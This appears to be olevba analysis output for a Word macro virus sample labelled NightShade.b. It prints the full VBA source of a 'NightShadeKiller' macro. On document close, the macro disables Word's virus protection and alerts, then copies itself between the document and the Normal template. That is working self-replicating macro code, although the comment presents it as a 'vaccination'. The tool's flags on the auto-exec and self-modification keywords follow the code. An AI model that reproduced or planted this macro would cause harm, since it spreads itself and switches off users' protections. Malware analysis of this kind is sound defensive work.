olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NightShade.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NightShade.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NightShadeKiller.bas 
in file: Virus.MSWord.NightShade.b - OLE stream: 'Macros/VBA/NightShadeKiller'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub AutoClose()
Attribute AutoClose.VB_Description = "Night Shade Killer - Vaccination to get rid of the NightShade word macro virus, that pretends to be an anti-virus Macro called ScanProt! 11/97, Ax"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "Project.NightShadeKiller.AutoClose"
On Error GoTo NightShadeKiller

     Assistant.Visible = True

        With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "VACCINATION FOR 'Word97.NightShadeKiller word macro virus'. I got so tired of cleaning this virus that I decided to use its own code to clean itself from the whole system- Clean up with a vengeance! - by Asterix!"
            .Heading = "Attention:"
            .Show
        End With

    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone

    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = False

    Set ActiveDoc = ActiveDocument
    Set GlobalDoc = NormalTemplate

    DocumentInstalled = False
    GlobalInstalled = False

    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(I).Name = "NightShadeKiller" Then
            DocumentInstalled = True
        End If
    Next

    For J = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(J).Name = "NightShadeKiller" Then
            GlobalInstalled = True
        End If
    Next

    If DocumentInstalled = False Then
        Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="NightShadeKiller", Object:=wdOrganizerObjectProjectItems
        ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
    End If

    If GlobalInstalled = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="NightShadeKiller", Object:=wdOrganizerObjectProjectItems
        Options.SaveNormalPrompt = False
    End If

     Application.DisplayAlerts = wdAlertsAll

NightShadeKiller:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

